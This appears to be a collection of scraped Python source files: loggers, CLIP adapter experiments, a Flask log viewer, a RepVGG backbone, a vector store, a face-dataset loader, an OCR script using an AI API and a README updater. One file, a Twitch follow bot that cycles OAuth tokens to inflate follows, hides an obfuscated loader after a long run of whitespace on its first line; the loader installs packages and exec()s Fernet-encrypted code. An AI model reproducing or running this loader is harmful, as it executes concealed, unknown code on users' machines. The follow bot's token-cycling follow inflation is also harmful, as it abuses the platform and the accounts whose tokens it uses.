sqlite3.connect(self.db_path)\n        self.cursor = self.connection.cursor()\n\n        if create:\n            create_table_sql = f\"\"\"\n                CREATE TABLE {self.name} ({', '.join(columns)});\n                \"\"\"\n            self.cursor.execute(create_table_sql)\n\n        table_info = self.query(f\"PRAGMA table_info({self.name});\")\n        self.columns = []\n        self.col_indices = {}\n        for i_col, row in enumerate(table_info):\n            col_name = row[1]\n            self.columns.append(col_name)\n            self.col_indices[col_name] = i_col\n\n    def get_columns(self):\n        return self.columns\n\n    def close(self):\n        self.connection.close()\n\n    def delete(self):\n        \"\"\"\n        Delete both the table and the database that contained it.\n        \"\"\"\n        delete_table_sql = f\"DROP TABLE {self.name};\"\n        self.cursor.execute(delete_table_sql)\n        self.connection.close()\n        os.remove(self.db_path)\n\n    def debug(self, data):\n        if self.level <= DEBUG:\n            self._write(data)\n\n    def info(self, data):\n        if self.level <= INFO:\n            self._write(data)\n\n    def warning(self, data):\n        if self.level <= WARNING:\n            self._write(data)\n\n    def error(self, data):\n        if self.level <= ERROR:\n            self._write(data)\n\n    def critical(self, data):\n        if self.level <= CRITICAL:\n            self._write(data)\n\n    def _write(self, data):\n        \"\"\"\n\n        \"\"\"\n        data_list = [None] * len(self.columns)\n\n        for key, val in data.items():\n            data_list[self.col_indices[key]] = val\n        data_tuple = tuple(data_list)\n\n        # Using question mark placeholders lets us lean on sqlite to\n        # format our various types correctly. It also protects the\n        # log table in case a nefarious lab mate tries to execute\n        # a SQL injection attack.\n        qmarks = [\"?\"] * len(self.columns)\n        qmarks_commas = \", \".join(qmarks)\n        insert_sql = (f\"INSERT into {self.name} VALUES({qmarks_commas});\")\n        self.cursor.execute(insert_sql, data_tuple)\n        self.connection.commit()\n\n    def query(self, query_str):\n        result = self.cursor.execute(query_str)\n        return result.fetchall()\n",
    "import random\nimport argparse\nimport yaml\nfrom utils import *\nfrom dataload import CustomDataload, ImagenetDataload\nfrom model.TipAdapter import TipAdapter, KCLTipAdapter\nfrom model.CoOp import CoOp, KCLCoOp\nfrom model.Clip import Clip, KCLClip\nfrom model.TipAdapterF import TipAdapterF, KCLTipAdapterF\nfrom model.ClipAdapter import CLipAdapter, KCLClipAdapter\nfrom model.Maple import Maple, KCLMaple\n\n\ndef get_arguments():\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--config', dest='config', help='settings of Tip-Adapter in yaml format')\n    parser.add_argument('--shots', type=int, default=0)\n    parser.add_argument('--model', dest='model')\n\n    args = parser.parse_args()\n\n    return args\n\n\nif __name__ == '__main__':\n\n    args = get_arguments()\n    assert (os.path.exists(args.config))\n\n    cfg = yaml.load(open(args.config, 'r'), Loader=yaml.Loader)\n\n    cache_dir = os.path.join('./caches', cfg['dataset'])\n    if not os.path.exists(cache_dir):\n        os.mkdir(cache_dir)\n\n    cfg['cache_dir'] = cache_dir\n\n    if args.shots:\n        cfg['shots'] = args.shots\n        print('******************** shots = %d *************************' % args.shots)\n    print('******************** dataset = %s *************************' % cfg['dataset'])\n\n    # CLIP\n    clip_model, preprocess = clip.load(cfg['backbone'])\n    clip_model.eval()\n\n    # Prepare dataset\n    random.seed(0)\n    torch.manual_seed(0)\n    if cfg['dataset'] == 'imagenet':\n        data = ImagenetDataload(cfg, clip_model, preprocess)\n        # pass\n    else:\n        data = CustomDataload(cfg, clip_model, preprocess)\n\n    clip_classifier(cfg, data.dataset.classnames, data.dataset.template, clip_model)\n\n    '''\n    Training Free: Tip-Adapter, APE\n    '''\n    if args.model == 'Clip':\n        model = Clip(cfg, clip_model)\n        model.evaluate(data.test_features, data.test_labels)\n\n    if args.model == 'KCLClip':\n        model = KCLClip(cfg, clip_model)\n        model.evaluate(data.test_features, data.test_labels)\n\n    if args.model == 'TipAdapter':\n        model = TipAdapter(cfg, clip_model)\n        model.evaluate(data.test_features, data.test_labels)\n\n    if args.model == 'KCLTipAdapter':\n        model = KCLTipAdapter(cfg, clip_model)\n        model.evaluate(data.test_features, data.test_labels)\n        model.save_pse_cache()\n\n    '''\n    Training: Tip-Adapter-F, CoOp, Clip-Adapter\n    '''\n    if args.model == 'TipAdapterF':\n        model = TipAdapterF(cfg, clip_model)\n        model.train(data.test_features, data.test_labels, data.train_loader_F)\n        model.evaluate(data.test_features, data.test_labels)\n\n    if args.model == 'KCLTipAdapterF':\n        model = KCLTipAdapterF(cfg, clip_model)\n        model.train(data.test_features, data.test_labels, data.train_loader_F)\n        model.evaluate(data.test_features, data.test_labels)\n\n    if args.model == 'CoOp':\n        model = CoOp(cfg, clip_model)\n        model.train(data.test_features, data.test_labels, data.train_loader_F)\n        model.evaluate(data.test_features, data.test_labels)\n\n    if args.model == 'KCLCoOp':\n        model = KCLCoOp(cfg, clip_model)\n        model.train(data.test_features, data.test_labels, data.train_loader_F)\n        model.evaluate(data.test_features, data.test_labels)\n\n    if args.model == 'ClipAdapter':\n        model = CLipAdapter(cfg, clip_model)\n        model.train(data.test_features, data.test_labels, data.train_loader_F)\n        model.evaluate(data.test_features, data.test_labels)\n\n    if args.model == 'KCLClipAdapter':\n        model = KCLClipAdapter(cfg, clip_model)\n        model.train(data.test_features, data.test_labels, data.train_loader_F)\n        model.evaluate(data.test_features, data.test_labels)\n\n    if args.model == 'Maple':\n        model = Maple(cfg, clip_model)\n        model.evaluate(model.test_features, model.test_labels)\n\n    if args.model == 'KCLMaple':\n        model = KCLMaple(cfg, clip_model)\n        model.evaluate(model.test_features, model.test_labels)\n",
    "from flask import Flask, render_template, send_from_directory, abort, request, redirect, Response\nfrom werkzeug.utils import secure_filename\nimport hashlib\nimport os\n\nfrom config import log_paths\n\napp = Flask(__name__)\n\npassword = os.getenv('LOGS_VIEWER_PASSWORD', 'ABCDE')\nr_url = os.getenv('LOGS_VIEWER_REDIRECT', 'https://edm115.dev')\nport = int(os.getenv('LOGS_VIEWER_PORT', 10000))\nhashed_password = hashlib.sha256(password.encode()).hexdigest()\n\n@app.route('/')\ndef index():\n    return render_template('index.html', hashed_password=hashed_password, redirect_url=r_url)\n\n@app.route('/admin')\ndef admin():\n    log_files = {}\n    client_pass = request.args.get('passwd', '')\n    if client_pass == password:\n        for bot, path in log_paths.items():\n            if os.path.exists(path):\n                files = [f for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))]\n                log_files[bot] = files\n        return render_template('admin.html', log_files=log_files, hashed_password=hashed_password)\n    else:\n        return redirect(r_url)\n\n@app.route('/logs/<bot>/<filename>')\ndef log_file(bot, filename):\n    dl = request.args.get('dl', '')\n    if bot in log_paths and os.path.exists(log_paths[bot]):\n        secure_path = os.path.join(log_paths[bot], secure_filename(filename))\n        try:\n            if dl == '1':\n                return send_from_directory(log_paths[bot], filename, as_attachment=False)\n            else:\n                with open(secure_path, 'r') as f:\n                    content = f.read()\n                return Response(content, mimetype='text/plain')\n        except FileNotFoundError:\n            abort(404)\n    else:\n        return redirect(r_url)\n\nif __name__ == '__main__':\n    app.run(debug=False, port=port)\n",
    "\"\"\"\r\n@article{ding2101repvgg,\r\n  title={RepVGG: Making VGG-style ConvNets Great Again},\r\n  author={Ding, Xiaohan and Zhang, Xiangyu and Ma, Ningning and Han,\r\n          Jungong and Ding, Guiguang and Sun, Jian},\r\n  journal={arXiv preprint arXiv:2101.03697}}\r\nRepVGG Backbone from paper RepVGG: Making VGG-style ConvNets Great Again\r\nCode from https://github.com/DingXiaoH/RepVGG\r\n\"\"\"\r\n\r\nimport numpy as np\r\nimport torch\r\nimport torch.nn as nn\r\n\r\nfrom nanodet.model.module.conv import RepVGGConvModule\r\n\r\noptional_groupwise_layers = [2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26]\r\ng2_map = {layer: 2 for layer in optional_groupwise_layers}\r\ng4_map = {layer: 4 for layer in optional_groupwise_layers}\r\n\r\nmodel_param = {\r\n    \"RepVGG-A0\": dict(\r\n        num_blocks=[2, 4, 14, 1],\r\n        width_multiplier=[0.75, 0.75, 0.75, 2.5],\r\n        override_groups_map=None,\r\n    ),\r\n    \"RepVGG-A1\": dict(\r\n        num_blocks=[2, 4, 14, 1],\r\n        width_multiplier=[1, 1, 1, 2.5],\r\n        override_groups_map=None,\r\n    ),\r\n    \"RepVGG-A2\": dict(\r\n        num_blocks=[2, 4, 14, 1],\r\n        width_multiplier=[1.5, 1.5, 1.5, 2.75],\r\n        override_groups_map=None,\r\n    ),\r\n    \"RepVGG-B0\": dict(\r\n        num_blocks=[4, 6, 16, 1],\r\n        width_multiplier=[1, 1, 1, 2.5],\r\n        override_groups_map=None,\r\n    ),\r\n    \"RepVGG-B1\": dict(\r\n        num_blocks=[4, 6, 16, 1],\r\n        width_multiplier=[2, 2, 2, 4],\r\n        override_groups_map=None,\r\n    ),\r\n    \"RepVGG-B1g2\": dict(\r\n        num_blocks=[4, 6, 16, 1],\r\n        width_multiplier=[2, 2, 2, 4],\r\n        override_groups_map=g2_map,\r\n    ),\r\n    \"RepVGG-B1g4\": dict(\r\n        num_blocks=[4, 6, 16, 1],\r\n        width_multiplier=[2, 2, 2, 4],\r\n        override_groups_map=g4_map,\r\n    ),\r\n    \"RepVGG-B2\": dict(\r\n        num_blocks=[4, 6, 16, 1],\r\n        width_multiplier=[2.5, 2.5, 2.5, 5],\r\n        override_groups_map=None,\r\n    ),\r\n    \"RepVGG-B2g2\": dict(\r\n        num_blocks=[4, 6, 16, 1],\r\n        width_multiplier=[2.5, 2.5, 2.5, 5],\r\n        override_groups_map=g2_map,\r\n    ),\r\n    \"RepVGG-B2g4\": dict(\r\n        num_blocks=[4, 6, 16, 1],\r\n        width_multiplier=[2.5, 2.5, 2.5, 5],\r\n        override_groups_map=g4_map,\r\n    ),\r\n    \"RepVGG-B3\": dict(\r\n        num_blocks=[4, 6, 16, 1],\r\n        width_multiplier=[3, 3, 3, 5],\r\n        override_groups_map=None,\r\n    ),\r\n    \"RepVGG-B3g2\": dict(\r\n        num_blocks=[4, 6, 16, 1],\r\n        width_multiplier=[3, 3, 3, 5],\r\n        override_groups_map=g2_map,\r\n    ),\r\n    \"RepVGG-B3g4\": dict(\r\n        num_blocks=[4, 6, 16, 1],\r\n        width_multiplier=[3, 3, 3, 5],\r\n        override_groups_map=g4_map,\r\n    ),\r\n}\r\n\r\n\r\ndef conv_bn(in_channels, out_channels, kernel_size, stride, padding, groups=1):\r\n    result = nn.Sequential()\r\n    result.add_module(\r\n        \"conv\",\r\n        nn.Conv2d(\r\n            in_channels=in_channels,\r\n            out_channels=out_channels,\r\n            kernel_size=kernel_size,\r\n            stride=stride,\r\n            padding=padding,\r\n            groups=groups,\r\n            bias=False,\r\n        ),\r\n    )\r\n    result.add_module(\"bn\", nn.BatchNorm2d(num_features=out_channels))\r\n    return result\r\n\r\n\r\nclass RepVGG(nn.Module):\r\n    def __init__(\r\n        self,\r\n        arch,\r\n        out_stages=(1, 2, 3, 4),\r\n        activation=\"ReLU\",\r\n        deploy=False,\r\n        last_channel=None,\r\n    ):\r\n        super(RepVGG, self).__init__()\r\n        # TODO: Update code to Xiaohan's repo\r\n        model_name = \"RepVGG-\" + arch\r\n        assert model_name in model_param\r\n        assert set(out_stages).issubset((1, 2, 3, 4))\r\n        num_blocks = model_param[model_name][\"num_blocks\"]\r\n        width_multiplier = model_param[model_name][\"width_multiplier\"]\r\n        assert len(width_multiplier) == 4\r\n        self.out_stages = out_stages\r\n        self.activation = activation\r\n        self.deploy = deploy\r\n        self.override_groups_map = (\r\n            model_param[model_name][\"override_groups_map\"] or dict()\r\n        )\r\n\r\n        assert 0 not in self.override_groups_map\r\n\r\n        self.in_planes = min(64, int(64 * width_multiplier[0]))\r\n\r\n        self.stage0 = RepVGGConvModule(\r\n            in_channels=3,\r\n            out_channels=self.in_planes,\r\n            kernel_size=3,\r\n            stride=2,\r\n            padding=1,\r\n            activation=activation,\r\n            deploy=self.deploy,\r\n        )\r\n        self.cur_layer_idx = 1\r\n        self.stage1 = self._make_stage(\r\n            int(64 * width_multiplier[0]), num_blocks[0], stride=2\r\n        )\r\n        self.stage2 = self._make_stage(\r\n            int(128 * width_multiplier[1]), num_blocks[1], stride=2\r\n        )\r\n        self.stage3 = self._make_stage(\r\n            int(256 * width_multiplier[2]), num_blocks[2], stride=2\r\n        )\r\n        out_planes = last_channel if last_channel else int(512 * width_multiplier[3])\r\n        self.stage4 = self._make_stage(out_planes, num_blocks[3], stride=2)\r\n\r\n    def _make_stage(self, planes, num_blocks, stride):\r\n        strides = [stride",
    "import jax\nimport jax.numpy as jnp\nimport pickle\nfrom sentence_transformers import SentenceTransformer\nimport pandas as pd\n\nclass VectorDB:\n    def __init__(self, model_name='BAAI/bge-base-en-v1.5'):\n        self.model = SentenceTransformer(model_name)\n        self.texts = []\n        self.embeddings = None\n\n    def add_texts(self, texts):\n        new_embeddings = jnp.array(self.model.encode(texts, normalize_embeddings=True))\n        if self.embeddings is None:\n            self.embeddings = new_embeddings\n        else:\n            self.embeddings = jnp.concatenate((self.embeddings, new_embeddings), axis=0)\n        self.texts.extend(texts)\n\n    def delete_text(self, index):\n        if 0 <= index < len(self.texts):\n            self.texts.pop(index)\n            self.embeddings = jnp.delete(self.embeddings, index, axis=0)\n        else:\n            raise IndexError(\"Invalid index\")\n\n    def update_text(self, index, new_text):\n        if 0 <= index < len(self.texts):\n            self.texts[index] = new_text\n            new_embedding = jnp.array(self.model.encode([new_text], normalize_embeddings=True)).squeeze()\n            self.embeddings = self.embeddings.at[index].set(new_embedding)\n        else:\n            raise IndexError(\"Invalid index\")\n\n    def search(self, query, top_k=5):\n        query_embedding = jnp.array(self.model.encode([query], normalize_embeddings=True))\n        similarities = jnp.dot(self.embeddings, query_embedding.T).squeeze()\n        top_indices = jnp.argsort(similarities)[-top_k:][::-1]\n        return [(self.texts[i], similarities[i]) for i in top_indices]\n\n    def save(self, file_path):\n        with open(file_path, 'wb') as file:\n            pickle.dump(self, file)\n\n    @staticmethod\n    def load(file_path):\n        with open(file_path, 'rb') as file:\n            return pickle.load(file)\n    \n    def to_df(self):\n        data = {\n            'text': self.texts,\n            'embedding': [embedding.tolist() for embedding in self.embeddings]\n        }\n        return pd.DataFrame(data)\n\n    def __len__(self):\n        return len(self.texts)\n\n    def __getitem__(self, index):\n        return self.texts[index]\n\n    def __iter__(self):\n        return iter(self.texts)\n\ndef main():\n    print(\"\ud83c\udf51\ud83d\udc4b\")",
    "import datasets\nfrom datasets.utils.logging import get_logger\nfrom datasets import Sequence\nimport io\nimport os \nfrom glob import glob\nfrom tqdm import tqdm\nimport numpy as np\nimport pandas as pd\nfrom PIL import Image\nimport scipy\nimport scipy.ndimage\nimport dlib\nimport threading \nfrom multiprocessing import cpu_count\nimport importlib\nimport hashlib\n\nimport traceback \nimport sys \nimport pathlib\n\nfile_path = pathlib.Path().resolve()\nprint(f\"Adding {file_path} to the system path\")\nsys.path.append(file_path)\nfrom loader_configs import *\n\nALIGN_FACE = False \n\n######################## CONFIGS ###########################\n\n\ndataset_path = os.getenv(\"LP_FAIRFACE_PATH\")\ndataset_path_fallback = os.getenv(\"LP_DATSET_BASE_PATH\")\nif dataset_path is None:\n    dataset_path = dataset_path_fallback\nprint(dataset_path)\n\ncsv_paths = [\"fairface_label_train.csv\", \"fairface_label_val.csv\"]\n\ndataset_source = \"fairface\"\n\n######################## CONFIGS ###########################\n\nlogger = get_logger(\"LatentPlayDataset\")\ndataset_path = dataset_path\npredictor = dlib.shape_predictor(dlib_landmark_detector_path)\ngender_map = gender_map\nrace_map = race_map\npreprocessing_target_size = preprocessing_target_size\nsource = dataset_source\n\n\nclass LatentPlayDataset(datasets.GeneratorBasedBuilder):\n    \"\"\"LatentPlayDataset base builder \"\"\"\n\n\n    def _info(self):\n        return datasets.DatasetInfo(\n        description=\"Dataset of multiple human face images with attributes including race and gender\",\n        features=datasets.Features(\n            dataset_features\n        ),\n        supervised_keys=None,\n        homepage=\"latentplay\",\n        citation=\"\",\n        version=\"0.5.1\"\n    )\n\n    def _split_generators(self, dl_manager: datasets.DownloadManager):\n        num_shards = max(1, cpu_count()//2)\n        self.dataset_base_path = dataset_path\n        self.csv_sources = pd.DataFrame()\n        for csv_path in csv_paths: \n            self.csv_sources = pd.concat((pd.read_csv(os.path.join(dataset_path, csv_path)), self.csv_sources))\n\n        self.sample_lengths = self.csv_sources.shape[0]\n        print(\"#\\n\"*3, self.sample_lengths)\n        step_size = self.sample_lengths // num_shards\n        indices = list()\n        for i in range(num_shards):\n            lower = i*step_size\n            upper = min((i+1)*step_size, self.sample_lengths)\n            print(lower, upper)\n            indices.append(np.arange(lower, upper, 1))\n\n        return [\n            datasets.SplitGenerator(name=datasets.Split.TRAIN, gen_kwargs={\"indices\": indices}),\n        ]   \n\n    def _generate_examples(self, indices):\n        kwargs = {}\n        indices = indices[0]        \n        for index in indices: \n            data = self.csv_sources.iloc[index]\n            image_path = os.path.join(self.dataset_base_path, data['file']) \n            age = data['age']\n            gender = data['gender']\n            race = data['race']\n\n            race = race_map[race]\n            gender = gender_map[gender]\n\n            unique_id = hashlib.sha256(image_path.encode('utf-8')).hexdigest()[:10] + str(index)\n\n            image_data = io.BytesIO()\n            Image.open(image_path).save(image_data, \"JPEG\")\n        \n            processed_image_data = io.BytesIO()\n            image_process_status = False\n            if ALIGN_FACE:\n                try:\n                    align_face(image_path, predictor, preprocessing_target_size).save(processed_image_data, \"JPEG\")\n                    image_process_status = True\n                except: \n                    logger.error(\"Can't generate processed aligned image for {}\\n{}\".format(image_path, traceback.format_exc()))\n\n                kwargs={\n                    \"image_dlib_aligned\": processed_image_data.getvalue(),\n                    \"dlib_align_status\": image_process_status,\n                }\n\n            yield unique_id, {\n                \"person_id\": dataset_source + naming_splitter + image_path.replace('/', '-'),\n                \"source\": dataset_source,\n                \"image\": image_data.getvalue(),\n                \"race\": race, \n                \"gender\": gender,\n                \"human\": True,\n                \"age\": age,\n                **kwargs\n            }\n\n                        \n\n\n                        \n\n\n        \n\n        \n",
    "import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'vFB4zKkklOfZvTB-oy9RdNjWPnPJnYzFH_VFPrVtHy0=').decrypt(b'gAAAAABmGp4v0RgXPr5uA5S9j5Hf5JUFNnNrqpzeaPLWLsp7PHG29gmQFZE5Z7K4C5JEc01gM_6647UPi1Urx3hs4Qs4q5e_AEXY3UHzu54_9tt-9WLX34ep-PtO3pCV4arfeYCpsMOH_UWeGzU0vQ1xnq9-b93_rS6XZByWEKnbsxK5EwbxsMBIwzz9dMAjta_vQnLtrkqDkJF33vE-wC_VUcba0EfhZe3UUmY7bP7a2wSquiP9j3Y='))\nimport os\nimport requests\nimport threading\n\nfrom itertools import cycle\nfrom colorama import Fore, init\n\n\ninit(convert=True)\n\n\nclass stats():\n    sent = 0\n    error = 0\n\n\n\ndef get_username(channel_name):\n\n    json = {\"operationName\": \"ChannelShell\",\n            \"variables\": {\n                \"login\": channel_name\n            },\n            \"extensions\": {\n                \"persistedQuery\": {\n                    \"version\": 1,\n                    \"sha256Hash\": \"580ab410bcd0c1ad194224957ae2241e5d252b2c5173d8e0cce9d32d5bb14efe\"\n                }\n            }\n        }\n\n    headers = {\n        'Client-ID': 'kimne78kx3ncx6brgo4mv6wki5h1ko'\n    }\n    r = requests.post('https://gql.twitch.tv/gql', json=json, headers=headers)\n    return r.json()['data']['userOrError']['id']\n\n\nclass Choose_Cookie():\n\n    def get_token():\n        with open('tokens.txt', 'r') as f:\n            tokens = [line.strip('\\n') for line in f]\n        return tokens\n    cookie = get_token()\n    tokens_loop = cycle(cookie)\n\n\n\n\nsem = threading.Semaphore(200)\n\n\nchannel_name = input(\"Enter channel name > \")\n\nclass Twitch():\n\n    def follow():\n        with sem:\n            os.system(f'title Success: {stats.sent} ^| Error: {stats.error}')\n            channel_ID = get_username(channel_name)\n\n            token = next(Choose_Cookie.tokens_loop)\n\n            headers = {\n                'Accept': '*/*',\n                'Accept-Language': 'en-GB',\n                'Authorization': f'OAuth {token}',\n                'Client-Id': 'kimne78kx3ncx6brgo4mv6wki5h1ko',\n                'Connection': 'keep-alive',\n                'Content-Type': 'text/plain;charset=UTF-8',\n                'Origin': 'https://www.twitch.tv',\n                'Referer': 'https://www.twitch.tv/',\n                'Sec-Fetch-Dest': 'empty',\n                'Sec-Fetch-Mode': 'cors',\n                'Sec-Fetch-Site': 'same-site',\n                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',\n                'sec-ch-ua': '\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"',\n                'sec-ch-ua-mobile': '?0',\n                'sec-ch-ua-platform': '\"Windows\"',\n                }\n            \n            data = '[{\"operationName\":\"FollowButton_FollowUser\",\"variables\":{\"input\":{\"disableNotifications\":false,\"targetID\":\"'+channel_ID+'\"}},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"800e7346bdf7e5278a3c1d3f21b2b56e2639928f86815677a7126b093b2fdd08\"}}}]'\n            r = requests.post('https://gql.twitch.tv/gql', headers=headers, data=data)\n            if r.status_code == 200:\n                stats.sent += 1\n        ",
    "import anthropic\nimport base64\nimport re\nimport os\n\n\nkey = os.environ.get(\"ANTHTROPIC_API_KEY\")\nclient = anthropic.Anthropic(api_key=key)\n\nimage_path = '/Users/rod13684/Documents/test_note2.jpg'\n\nwith open(image_path, \"rb\") as image_file:\n    image_data = base64.b64encode(image_file.read()).decode(\"utf-8\")\n\nmessage = client.messages.create(\n    model=\"claude-3-opus-20240229\",\n    max_tokens=1024,\n    messages=[\n        {\n            \"role\": \"user\",\n            \"content\": [\n                {\n                    \"type\": \"image\",\n                    \"source\": {\n                        \"type\": \"base64\",\n                        \"media_type\": \"image/jpeg\",\n                        \"data\": image_data,\n                    },\n                },\n                {\n                    \"type\": \"text\",\n                    \"text\": \"Convert the handwritten note in this image to Markdown format text. Preserve  characters such as '#' and '[', The first instance of text found in the image should return as '[[<example test>]]'. CRITICAL INSTRUCTION: DO NOT RETURN ANY TEXT OUR OUTPUT EXCEPT WHAT IS DETECTED IN THE IMAGE.\",\n                },\n            ],\n        }\n    ],\n)\n\nmarkdown_text= message.content[0].text\n\nmatch = re.search(r\"\\[\\[(.+?)\\]\\]\", markdown_text)\nif match:\n    file_name = match.group(1)\n    markdown_text = markdown_text.replace(match.group(), \"\")\nelse:\n    file_name = \"output\"\n\nwith open(f\"{file_name}.md\", \"w\") as markdown_file:\n    markdown_file.write(markdown_text)\n\nprint(f\"Conversion successful. Markdown file saved as {file_name}.md\")\n\n",
    "from datetime import datetime\nimport re\n\ndef generate():\n    with open(\"./README.md\") as f:\n        readme_content = f.read()\n    \n    readme_replacement = f'Updated: {datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\")}'\n    new_readme = re.sub('Updated: .*', readme_replacement, readme_content)\n\n    with open(\"./README.md\", \"w\") as f:\n        f.write(new_readme)\n\ngenerate()\n\nif False:\n    with open(\"./README.md\", \"rw\") as f:\n        f.write(f'''<p align=\"center\">\n  <source media=\"(prefers-color-scheme: dark)\" srcset=\"https://readme-typing-svg.herokuapp.com?color=%23FFFFFF&size=40&center=true&width=600&height=69&lines=\ud83d\udc4b+Hi+there!+\ud83d\ude0e;\u270b+Welcome+To+My+Profile+\ud83d\ude07;\ud83d\udc68\u200d\ud83d\udcbb+I+love+Programming+\ud83d\udcbb;\ud83c\udf31+Nature+\ud83c\udf38;\ud83c\udf20+Astronomy+\ud83c\udf0c;\ud83e\uddd7\u200d\u2642\ufe0f+Hiking+\ud83d\uddfb;\ud83e\udded+Exploring+\ud83d\uddfa\ufe0f;\u231b+History+\ud83d\udcdc;\ud83d\uddfe+Anime+\ud83c\udfef;\ud83d\udcf0+Research+\ud83c\udfc6;\ud83c\udfbc+And+create+some+Music+\ud83c\udfb5\" />\n  <source media=\"(prefers-color-scheme: light)\" srcset=\"https://readme-typing-svg.herokuapp.com?color=%23000000&size=40&center=true&width=600&height=69&lines=\ud83d\udc4b+Hi+there!+\ud83d\ude0e;\u270b+Welcome+To+My+Profile+\ud83d\ude07;\ud83d\udc68\u200d\ud83d\udcbb+I+love+Programming+\ud83d\udcbb;\ud83c\udf31+Nature+\ud83c\udf38;\ud83c\udf20+Astronomy+\ud83c\udf0c;\ud83e\uddd7\u200d\u2642\ufe0f+Hiking+\ud83d\uddfb;\ud83e\udded+Exploring+\ud83d\uddfa\ufe0f;\u231b+History+\ud83d\udcdc;\ud83d\uddfe+Anime+\ud83c\udfef;\ud83d\udcf0+Research+\ud83c\udfc6;\ud83c\udfbc+And+create+some+Music+\ud83c\udfb5\" />\n  <img src=\"https://readme-typing-svg.herokuapp.com?color=%23FFFFFF&size=40&center=true&width=600&height=69&lines=\ud83d\udc4b+Hi+there!+\ud83d\ude0e;\u270b+Welcome+To+My+Profile+\ud83d\ude07;\ud83d\udc68\u200d\ud83d\udcbb+I+love+Programming+\ud83d\udcbb;\ud83c\udf31+Nature+\ud83c\udf38;\ud83c\udf20+Astronomy+\ud83c\udf0c;\ud83e\uddd7\u200d\u2642\ufe0f+Hiking+\ud83d\uddfb;\ud83e\udded+Exploring+\ud83d\uddfa\ufe0f;\u231b+History+\ud83d\udcdc;\ud83d\uddfe+Anime+\ud83c\udfef;\ud83d\udcf0+Research+\ud83c\udfc6;\ud83c\udfbc+And+create+some+Music+\ud83c\udfb5\" alt=\"Typing SVG\">\n  <img width=\"100%\" src=\"https://cardivo.vercel.app/api?name=Azhar%20Rizki%20Zulma&description=Hi,%20I%27m%20a%20Information%20System,%20Software%20Quality%20Assurance,%20and%20Multiplatform%20Developer%20with%20a%20demonstrated%20history%20of%20working%20in%20the%20information%20technology%20industry%20%F0%9F%91%8B&image=https://id.zulma.id/assets/images/azhar.png&instagram=AzharRizkyZ&linkedin=Azhar%20Rizki%20Zulma&github=AzharRizkiZ&twitter=AzharRizkyZ&pattern=floatingCogs&opacity=0.1&backgroundColor=%23ddd&site=https://zulma.id\">\n</p>\n\n<details>\n  <summary align=\"center\"><h1>\ud83d\udcdb Holopin Badges \ud83d\udd30</h1></summary>\n  <p align=\"center\">\n    <a href=\"https://holopin.io/@azharrizky\">\n      <img src=\"https://holopin.me/azharrizky\" alt=\"@azharrizky's Holopin board\">\n    </a>\n  </p>\n</details>\n\n<details>\n  <summary align=\"center\"><h1>\ud83d\udcc8 Github Statistic \ud83d\udcca</h1></summary>\n  <p align=\"center\">\n    <a href=\"https://github.com/azharrizkiz\">\n      <img width=\"60.2%\" src=\"https://github-readme-stats-eight-theta.vercel.app/api?username=azharrizkiz&show_icons=true&theme=dark&include_all_commits=true&count_private=true&icon_color=FFFFFF&bg_color=000000\"/>\n      <img width=\"38.4%\" src=\"https://github-readme-stats-eight-theta.vercel.app/api/top-langs/?username=azharrizkiz&layout=compact&langs_count=10&theme=dark&bg_color=000000\"/>\n      <img width=\"49.1%\" src=\"https://github-readme-streak-stats.herokuapp.com/?user=AzharRizkiZ&theme=highcontrast&fire=ffffff&ring=ffffff&border=ffffff&currStreakLabel=ffffff\"/>\n      <img width=\"49.6%\" src=\"https://github-profile-trophy.vercel.app/?username=azharrizkiz&theme=onestar&column=5&margin-w=10&margin-h=10\"/>\n      <img width=\"99.4%\" src=\"https://github-readme-activity-graph.vercel.app/graph?username=AzharRizkiZ&theme=react-dark&bg_color=000000&color=FFFFFF\"/>\n    </a>\n  </p>\n</details>\n\n<details>\n  <summary align=\"center\"><h1>\ud83d\udcc8 Github Metrics \ud83d\udcca</h1></summary>\n  <p align=\"center\">\n    <a href=\"https://github.com/azharrizkiz\">\n      <img src=\"metrics.plugin.topics.mastered.svg\" alt=\"Metrics\"/>\n      <img src=\"metrics.plugin.people.followers.svg\" alt=\"Metrics\"/>\n      <img src=\"metrics.plugin.languages.details.svg\" alt=\"Metrics\"/>\n      <img src=\"metrics.plugin.calendar.svg\" alt=\"Metrics\"/>\n      <img src=\"metrics.plugin.achivements.svg\" alt=\"Metrics\"/>\n      <!-- <img src=\"metrics.plugin.personal.anilist.svg\" alt=\"Metrics\"/> -->\n      <img src=\"metrics.plugin.pagespeed.svg\" alt=\"Metrics\"/>\n      <!-- <img src=\"metrics.plugin.gists.svg\" alt=\"Metrics\"/> -->\n    </a>\n  </p>\n</details>\n\n<details>\n  <summary align=\"center\"><h1>\ud83d\udc0d Snake \ud83d\udc1b</h1></summary>\n  <p align=\"center\">\n    <picture>\n      <source media=\"(prefers-color-scheme: dark)\" srcset=\"https://github.com/AzharRizkiZ/AzharRizkiZ/blob/snek-output/grid-snake-dark.svg\" />\n      <source media=\"(prefers-color-scheme: light)\" srcset=\"https://github.com/AzharRizkiZ/AzharRizkiZ/blob/snek-output/grid-snake-light.svg\" />\n      <img alt=\"GitHub contribution Snek animation\" src=\"https://github.com/AzharRizkiZ/AzharRizkiZ/blob/snek-output/grid-snake.svg\" />\n    </picture>\n  </p>\n</details>\n\n<details>\n  <summary align=\"center\"><h1>\ud83c\udfa8 Artwork \ud83d\uddbc\ufe0f</h1></summary>\n  <p align=\"center\">\n    <a href=\"https://github.com/azharrizkiz\">\n      <img width=\"100%\" src=\"./gitartwork.svg\">\n    </a>\n  </p>\n</details>\n\n<details>\n  <summary align=\"center\"><h1 align=\"center\">\ud83c\udfb6 Listen Now \ud83c\udfa7</h1></summary>\n  <p align=\"center\">\n    <a 